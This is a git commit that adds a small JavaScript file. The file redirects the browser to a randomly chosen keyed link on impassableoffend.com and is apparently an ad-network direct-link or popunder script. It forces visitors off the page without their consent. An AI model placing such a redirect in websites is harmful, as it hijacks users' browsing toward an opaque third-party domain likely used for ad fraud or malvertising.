57249f43f45e1c0a7467cefc2b07c2b118668449
Jamawe12 <93462207+Jamawe12@users.noreply.github.com>
2026-07-05 09:14:44 +0700

    Create akeadsmingg222.js

---
+++ akeadsmingg222.js
@@ -0,0 +1,12 @@
+var dataUrl = [
+
+'https://impassableoffend.com/frik9vyd?key=13e375eb7e8fd8aa1f5cb283b4057627',
+'https://impassableoffend.com/crya9k2x6?key=c3ddf144181d5fbd0dc73d00e1c280ac',
+'https://impassableoffend.com/frik9vyd?key=13e375eb7e8fd8aa1f5cb283b4057627',
+'https://impassableoffend.com/crya9k2x6?key=c3ddf144181d5fbd0dc73d00e1c280ac',
+'https://impassableoffend.com/frik9vyd?key=13e375eb7e8fd8aa1f5cb283b4057627',
+'https://impassableoffend.com/crya9k2x6?key=c3ddf144181d5fbd0dc73d00e1c280ac'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
